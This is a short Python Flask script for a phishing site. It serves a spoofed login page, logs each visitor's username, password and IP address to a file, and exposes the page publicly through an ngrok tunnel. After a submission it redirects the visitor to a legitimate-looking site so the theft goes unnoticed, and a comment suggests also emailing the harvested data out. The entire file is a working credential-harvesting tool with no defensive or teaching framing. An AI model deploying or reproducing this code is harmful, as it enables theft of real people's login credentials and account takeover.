from flask import Flask, request, render_template_string, redirect
from pyngrok import ngrok
import os
import logging

# Configure logging to log collected data
logging.basicConfig(filename='collected_data.log', level=logging.INFO, format='%(asctime)s - %(message)s')

app = Flask(__name__)

# Create a basic spoof site HTML
html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
</head>
<body>
    <h2>Welcome to the Login Page</h2>
    <form method="POST" action="/login">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_content)

@app.route('/login', methods=['POST'])
def login():
    # Capture username, password, and IP address
    username = request.form['username']
    password = request.form['password']
    ip_address = request.remote_addr
    
    # Log the collected data
    logging.info(f"IP: {ip_address}, Username: {username}, Password: {password}")
    
    # You can add more actions here, like sending this data via email, etc.
    return redirect("https://real-site.com")  # Redirect to a legitimate site (or elsewhere)

if __name__ == "__main__":
    # Expose the local Flask app to the internet using ngrok
    public_url = ngrok.connect(5000)
    print(f" * ngrok tunnel \"{public_url}\" -> \"http://127.0.0.1:5000\"")
    
    # Run the Flask app
    app.run(port=5000)
